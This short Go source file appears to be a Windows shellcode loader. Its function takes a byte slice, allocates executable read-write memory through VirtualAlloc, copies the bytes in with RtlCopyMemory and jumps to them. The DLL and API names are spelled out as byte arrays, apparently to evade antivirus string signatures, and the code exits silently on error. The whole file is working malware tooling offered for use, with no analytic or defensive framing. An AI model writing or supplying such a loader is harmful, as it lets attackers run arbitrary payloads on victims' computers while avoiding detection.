package loader

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	a = syscall.MustLoadDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	b = syscall.MustLoadDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	c = a.MustFindProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}))
	d = b.MustFindProc(string([]byte{'R', 't', 'l', 'C', 'o', 'p', 'y', 'M', 'e', 'm', 'o', 'r', 'y'}))
)

func Y(sc []byte) {
	addr, _, err := c.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = d.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
